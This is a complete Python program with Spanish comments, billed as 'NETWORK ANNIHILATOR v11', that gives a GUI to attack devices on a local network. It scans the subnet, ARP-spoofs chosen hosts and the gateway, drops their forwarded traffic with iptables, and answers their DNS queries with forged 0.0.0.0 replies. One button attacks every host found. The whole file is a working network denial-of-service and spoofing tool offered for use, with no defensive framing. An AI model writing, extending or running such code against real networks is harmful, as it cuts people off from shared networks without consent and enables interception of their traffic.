#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BLACK OPS v11 - IRONCLAD EDITION
Estabilidad total de GUI + Ataque de Alta Presión.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import multiprocessing
import time
import random
import subprocess
import os
import sys
import signal
from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr)

conf.verb = 0
conf.sniff_promisc = True

# ==================== MOTORES DE ATAQUE ====================

def motor_spoof_rafaga(targets_queue, control_event, net_info):
    ip_gw = net_info['gw']
    mac_local = net_info['mac_l']
    mac_gw = net_info['mac_gw']
    active_targets = {}

    while not control_event.is_set():
        # Procesar TODA la cola antes de seguir para evitar lag
        while not targets_queue.empty():
            try:
                ip, mac, active = targets_queue.get_nowait()
                if active: active_targets[ip] = mac
                elif ip in active_targets: del active_targets[ip]
            except: break

        if active_targets:
            for ip, mac in active_targets.items():
                try:
                    p1 = ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_local)
                    p2 = ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_local)
                    send([p1, p2], verbose=0, count=5, inter=0.002)
                except: pass
        
        # Jitter optimizado para no bloquear la lectura de la cola
        time.sleep(0.1)

def motor_dns_blackhole(targets_queue, control_event, net_info):
    ip_local = net_info['ip_l']
    active_ips = set()

    def dns_handler(pkt):
        if pkt.haslayer(DNSQR) and not pkt.haslayer(DNSRR):
            ip_src = pkt[IP].src
            if ip_src in active_ips:
                try:
                    spoofed_pkt = (IP(dst=ip_src, src=pkt[IP].dst)/
                                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/
                                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="0.0.0.0")))
                    send(spoofed_pkt, verbose=0, count=2)
                except: pass

    sniffer = AsyncSniffer(filter="udp port 53", prn=dns_handler, store=0)
    sniffer.start()
    
    while not control_event.is_set():
        while not targets_queue.empty():
            try:
                ip, _, active = targets_queue.get_nowait()
                if active: active_ips.add(ip)
                else: active_ips.discard(ip)
            except: break
        time.sleep(0.2)
    sniffer.stop()

# ==================== INTERFAZ REFORZADA ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v11 - IRONCLAD")
        self.root.geometry("1000x850")
        self.root.configure(bg="#050505")
        
        self.net_info = {}
        self.targets = {} # Diccionario limpio
        self.queue_spoof = multiprocessing.Queue()
        self.queue_dns = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        
        self.init_network()
        self.setup_ui()
        self.start_engines()

    def init_network(self):
        try:
            route_out = subprocess.getoutput("ip route show default").split()
            iface, gw = route_out[4], route_out[2]
            ip_l, mac_l = get_if_addr(iface), get_if_hwaddr(iface)
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            mac_gw = ans[0][1].hwsrc
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            self.net_info = {'gw': gw, 'ip_l': ip_l, 'mac_l': mac_l, 'iface': iface, 'mac_gw': mac_gw}
        except Exception as e:
            print(f"Error de red: {e}"); sys.exit(1)

    def start_engines(self):
        self.p_spoof = multiprocessing.Process(target=motor_spoof_rafaga, args=(self.queue_spoof, self.control_event, self.net_info))
        self.p_dns = multiprocessing.Process(target=motor_dns_blackhole, args=(self.queue_dns, self.control_event, self.net_info))
        self.p_spoof.start()
        self.p_dns.start()

    def setup_ui(self):
        # Estética Hacker Pro
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#0a0a0a", foreground="#0f0", fieldbackground="#0a0a0a")
        
        tk.Label(self.root, text="NETWORK ANNIHILATOR v11 // IRONCLAD", bg="#800", fg="white", font=("Impact", 20)).pack(fill="x")

        f_btns = tk.Frame(self.root, bg="#050505", pady=10)
        f_btns.pack()
        tk.Button(f_btns, text="🔍 ESCANEAR", command=self.scan, width=15, bg="#222", fg="#0f0").pack(side="left", padx=5)
        tk.Button(f_btns, text="🚀 ANULAR TODO", command=self.attack_all, width=15, bg="#400", fg="white").pack(side="left", padx=5)
        tk.Button(f_btns, text="🚨 RESET", command=self.restore_all, width=15, bg="#004", fg="white").pack(side="left", padx=5)

        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "STATUS"), show="headings", height=18)
        for col in ("IP", "MAC", "STATUS"): self.tree.heading(col, text=col)
        self.tree.pack(fill="both", expand=True, padx=20)
        
        # FIX BINDING: Validación de selección antes de ejecutar
        self.tree.bind("<Double-1>", self.safe_double_click)

        self.log_box = scrolledtext.ScrolledText(self.root, height=8, bg="black", fg="#0f0", font=("Consolas", 9))
        self.log_box.pack(fill="x", padx=20, pady=10)

    def safe_double_click(self, event):
        item = self.tree.selection()
        if item: # Si no hay selección, no hace nada. No explota.
            self.toggle_target(item[0])

    def log(self, msg):
        self.log_box.insert(tk.END, f"[*] {msg}\n"); self.log_box.see(tk.END)

    def scan(self):
        self.log("Limpiando registros y escaneando...")
        self.restore_all() # Limpiar iptables antes de un nuevo scan
        self.targets.clear() # FIX: Diccionario vacío
        for i in self.tree.get_children(): self.tree.delete(i)
        
        red = self.net_info['gw'] + "/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=3, verbose=0)
        for _, rcv in ans:
            if rcv.psrc not in [self.net_info['ip_l'], self.net_info['gw']]:
                self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE"))
        self.log(f"Escaneo listo. {len(self.targets)} objetivos.")

    def toggle_target(self, ip):
        # FIX: Verificación de existencia de IP
        if ip not in self.targets: return
        
        is_active = not self.targets[ip]['active']
        self.targets[ip]['active'] = is_active
        self.tree.item(ip, values=(ip, self.targets[ip]['mac'], "ANULADO" if is_active else "LIVE"))
        
        # Enviar a colas
        self.queue_spoof.put((ip, self.targets[ip]['mac'], is_active))
        self.queue_dns.put((ip, self.targets[ip]['mac'], is_active))
        
        # Reglas de Kernel
        cmd = "-I" if is_active else "-D"
        subprocess.run(["iptables", cmd, "FORWARD", "-s", ip, "-j", "DROP"], capture_output=True)
        subprocess.run(["iptables", cmd, "FORWARD", "-d", ip, "-j", "DROP"], capture_output=True)
        self.log(f"IP {ip} {'Bloqueada' if is_active else 'Liberada'}")

    def attack_all(self):
        for ip in self.targets:
            if not self.targets[ip]['active']: self.toggle_target(ip)

    def restore_all(self):
        for ip in list(self.targets.keys()):
            if self.targets[ip]['active']: self.toggle_target(ip)
        subprocess.run(["iptables", "-F"], capture_output=True)

    def on_close(self):
        # FIX: Orden de cierre táctico
        self.log("Cerrando motores...")
        self.control_event.set() # 1. Avisar a los hijos que paren
        time.sleep(0.3) # 2. Darles tiempo de leer el evento
        self.restore_all() # 3. Limpiar red
        self.p_spoof.terminate() # 4. Por si acaso
        self.p_dns.terminate()
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0: print("SUDO!"); sys.exit(1)
    multiprocessing.freeze_support()
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
